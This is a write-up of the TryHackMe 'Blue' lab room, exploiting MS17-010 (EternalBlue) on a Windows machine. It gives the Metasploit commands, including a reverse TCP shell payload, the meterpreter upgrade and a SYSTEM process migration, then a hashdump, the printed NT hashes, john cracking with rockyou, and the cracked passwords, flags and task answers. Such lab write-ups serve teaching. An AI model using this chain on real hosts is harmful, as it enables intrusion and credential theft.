# 3.3 - [Blue](https://tryhackme.com/room/blue)

## 🔍 Overview
- Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
- Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.

## 💥 Exploitation

### Step 1: Metasploit Console
- We're using `ms17-010` which has an exploit on Metasploit known as eternal blue
    - `msfconsole` to open up metasploit
    - `search ms17-010` brings up a bunch of exploits, but the first option `exploit/windows/smb/ms17_010_eternalblue` is the one we want
    - `use exploit/windows/smb/ms17_010_eternalblue` and then `set RHOSTS TARGET_IP`
- Before running this, we might as well set the payload already
    - `set payload windows/x64/shell/reverse_tcp`
- And finally, `exploit`

### Step 2: Privilege Escalation
- Now, we want to upgrade from shell to meterpreter
    - In order to do this, need to set the current exploit to the background
    - Hard to do in tryhackme attackbox when you're using macOS, but you can use `exploit -z`, add the `-z` flag to start the exploit in the background
        - To confirm, use `sessions`
    - Then, `use post/multi/manage/shell_to_meterpreter` to use the options
    - From what you got earlier when you looked at `sessions`, set it for this module `set SESSION your_session_number`
- After it runs, use `sessions -i upgraded_session_number`
    - Confirm escalated privilege with `shell` followed by `whoami`
    - Exit out of shell with `exit`
    - List all running processes with `ps`
    - Find one that is using `NT AUTHORITY\SYSTEM`
    - I found this one `2480 | 728 | taskhost.exe | x64 | 0 | NT AUTHORITY\SYSTEM    C:\Windows\system32\taskhost.exe`
    - This is a little unstable and you may need to exploit again if it fails

### Step 3: Password Harvesting
- Once you've escalated your privilege, simply do a `hashdump` to get all username/password pairs
    - Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
    - Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    - Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
- Save into a hash file `cat echo ... >> hash`
- Use `john` to break the hash
    - `sudo john hash -w=/usr/share/wordlists/rockyou.txt --format=NT`
- Broken hashes:
    - Guest:?
    - Administrator:Password321
    - Jon:alqfna22

### Step 4: Flag Hunting
- Flag1? This flag can be found at the system root
    - Obviously, `cd C:\`
    - `type flag1.txt`
    - `flag{access_the_machine}`
- *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.
    - `cd C:\Windows\system32\config`
    - `type flag2.txt`
    - `flag{sam_database_elevated_access}`
- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
    - `cd C:\Users\Administrator\Documents`
    - `type flag3.txt`
    - `flag{admin_documents_can_be_valuable}`

## 📝 Task Answers
- How many ports are open with a port number under 1000? → `3`
- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) → `ms17-010`

- Show options and set the one required value. What is the name of this value? (All caps for submission) → `RHOSTS`
- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. - Copy this password hash to a file and research how to crack it. What is the cracked password? → `answer`
